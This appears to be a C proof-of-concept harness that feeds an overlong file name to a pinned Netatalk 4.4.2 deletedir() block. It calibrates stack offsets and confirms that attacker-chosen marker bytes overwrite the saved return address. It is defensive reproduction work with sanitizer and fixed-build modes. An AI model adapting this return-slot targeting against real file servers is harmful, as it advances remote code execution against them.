/*
 * Replay driver for the verbatim pinned Netatalk 4.4.2 deletedir() block.
 * The production function is included from gen_block.h under
 * #line 147 "directory.c"; NO production statement is reimplemented here.
 * Everything below "harness stubs" is scaffolding that feeds a synthetic
 * dirent to the real function and observes the resulting write. No daemon,
 * socket or AFP session is created; provisioning/loopback discipline only.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <setjmp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <stddef.h>
#include <sys/types.h>

/* Advisory-grounded lab configuration: path[MAXPATHLEN+1] is 1025 bytes. */
#ifndef MAXPATHLEN
#define MAXPATHLEN 1024
#endif
#define AFP_OK 0
#define AFPERR_PARAM (-1)

struct vol { int unused; };

/* ---------------- harness stubs ---------------- */
static char g_name[NAME_MAX + 1];
static struct dirent g_de;
static int g_name_calls, g_calls;
static unsigned char *g_ret_slot;
static unsigned char *g_path;
static size_t g_path_len;
static size_t g_first_changed = (size_t) -1;
static unsigned char g_before[64], g_after[64];
static unsigned char g_read0[8], g_read64[8], g_readret[8];
static ptrdiff_t g_path_to_ret = -1, g_ret_from_write = -1;
static jmp_buf g_escape;
static int g_escape_armed, g_escaped;
static int g_calibrating, g_fixed;
static const char g_marker[] = "NET2SHELL";
#define MARKER_LEN 8

static inline int vol_syml_opt(const struct vol *v)
{
    (void)v;
    return 0;
}

static DIR *harness_opendirat(int dirfd, const char *dir)
{
    (void)dirfd;
    (void)dir;
    /* Caller frame (deletedir) saved-return slot: x86-64 SysV instrumentation. */
    g_ret_slot = (unsigned char *) __builtin_frame_address(1) + sizeof(void *);
    if (!g_calibrating)
        for (size_t i = 0; i < sizeof(g_before); i++)
            g_before[i] = g_ret_slot[i]; /* snapshot BEFORE the strcpy */
    return (DIR *)&g_de;
}

static struct dirent *harness_readdir(DIR *dp)
{
    (void)dp;
    g_name_calls++;
    if (g_name_calls == 1 || g_name_calls == 2) {
        strcpy(g_de.d_name, g_name_calls == 1 ? "." : "..");
        return &g_de;
    }
    if (g_name_calls == 3) {
        memcpy(g_de.d_name, g_name, strlen(g_name) + 1);
        return &g_de;
    }
    return NULL;
}

static int harness_ostatat(int dirfd, const char *path, struct stat *st, int flags)
{
    (void)dirfd;
    (void)st;
    (void)flags;
    g_calls++;
    g_path = (unsigned char *)path;
    g_path_to_ret = g_ret_slot - g_path;
    g_ret_from_write = g_path_to_ret - (ptrdiff_t)g_path_len;

    if (!g_calibrating) {
        for (size_t i = 0; i < sizeof(g_after); i++)
            g_after[i] = g_ret_slot[i]; /* snapshot AFTER the strcpy */
        for (size_t i = 0; i < sizeof(g_before); i++) {
            if (g_before[i] != g_after[i]) {
                g_first_changed = i;
                break;
            }
        }
        /* Read the attacker bytes while the deletedir frame is still live. */
        memcpy(g_read0, g_path + g_path_len, MARKER_LEN);
        memcpy(g_read64, g_path + g_path_len + 64, MARKER_LEN);
        if (g_ret_from_write >= 0 && g_ret_from_write <= 255 - MARKER_LEN)
            memcpy(g_readret, g_path + g_path_len + (size_t)g_ret_from_write, MARKER_LEN);
    }
    if (g_escape_armed && !g_fixed && !g_calibrating) {
        g_escaped = 1;
        longjmp(g_escape, 1); /* scaffold: never execute the corrupted return */
    }
    return -1; /* force the next readdir to end the loop */
}

static int harness_unlinkat(int dirfd, const char *path)
{
    (void)dirfd;
    (void)path;
    return 0;
}

static int harness_rmdir(int dirfd, const char *dir)
{
    (void)dirfd;
    (void)dir;
    return 0;
}
static void harness_closedir(DIR *dp)
{
    (void)dp; /* synthetic DIR is harness-owned, never heap allocated */
}

#define opendirat harness_opendirat
#define readdir harness_readdir
#define ostatat harness_ostatat
#define netatalk_unlinkat harness_unlinkat
#define netatalk_rmdir harness_rmdir
#define closedir harness_closedir

#include "gen_block.h" /* verbatim pinned upstream lines 147-203 */

/* ---------------- driver ---------------- */
static void fill_name(size_t n)
{
    memset(g_name, 0, sizeof(g_name));
    for (size_t i = 0; i < n; i++)
        g_name[i] = g_marker[i % MARKER_LEN];
    g_name[n] = '\0';
}

static int invoke(size_t dir_len)
{
    char dir[1200];
    memset(dir, 'd', dir_len);
    dir[dir_len] = '\0';
    g_path_len = dir_len + 1; /* strlen(path) after snprintf("%s/") */
    g_name_calls = g_calls = 0;
    g_first_changed = (size_t)-1;
    g_path_to_ret = g_ret_from_write = -1;
    return deletedir(NULL, -1, dir);
}

static void print_hex(const unsigned char *p, size_t n)
{
    for (size_t i = 0; i < n; i++)
        printf("%02x", p[i]);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "capture";
#ifdef FIXED_BUILD
    g_fixed = 1;
#endif

    /* Frame geometry calibration with a short, non-overflowing name. */
    fill_name(1);
    g_calibrating = 1;
    (void)invoke(1022);
    g_calibrating = 0;
    ptrdiff_t ret_from_base = g_ret_from_write;
    /* Align the saved-return slot to an 8-byte marker boundary. */
    size_t adjust = (size_t)((ret_from_base % MARKER_LEN + MARKER_LEN) % MARKER_LEN);
    size_t dir_len = 1022 + adjust;

    fill_name(NAME_MAX);
    if (strcmp(mode, "asan") == 0) {
        (void)invoke(dir_len);
        return 0; /* ASan faults inside the verbatim strcpy before returning */
    }
    if (setjmp(g_escape) == 0) {
        g_escape_armed = 1;
        (void)invoke(dir_len);
    }
    g_escape_armed = 0;

    printf("LAYOUT dir_len=%zu path_len=%zu name_len=%zu write_len=%zu "
           "path_to_ret=%td ret_from_write=%td calls=%d\n",
           dir_len, g_path_len, strlen(g_name), strlen(g_name) + 1,
           g_path_to_ret, g_ret_from_write, g_calls);
    printf("CALIBRATION ret_from_write_base=%td adjusted_by=%zu\n",
           ret_from_base, adjust);
    printf("CAPTURE escaped=%d first_changed=%zu calls=%d\n",
           g_escaped, g_first_changed, g_calls);

    if (g_calls == 0 || g_path == NULL) {
        printf("FIXED_NO_WRITE marker_never_reached=1\n");
        return 0;
    }

    for (size_t i = 0; i < 2; i++) {
        size_t off = i == 0 ? 0 : 64;
        const unsigned char *at = i == 0 ? g_read0 : g_read64;
        int match = memcmp(at, g_marker, MARKER_LEN) == 0;
        printf("VICTIM requested_offset=%zu chosen_offset=%d supplied=", off, match ? (int)off : -1);
        print_hex(at, MARKER_LEN);
        printf(" expected=");
        print_hex((const unsigned char *)g_marker, MARKER_LEN);
        printf("\n");
    }

    int equal = memcmp(g_readret, g_after, MARKER_LEN) == 0;
    printf("RET_SLOT offset=%td attacker=", g_ret_from_write);
    print_hex(g_readret, MARKER_LEN);
    printf(" observed=");
    print_hex(g_after, MARKER_LEN);
    printf(" equal=%d\n", equal);
    return 0;
}
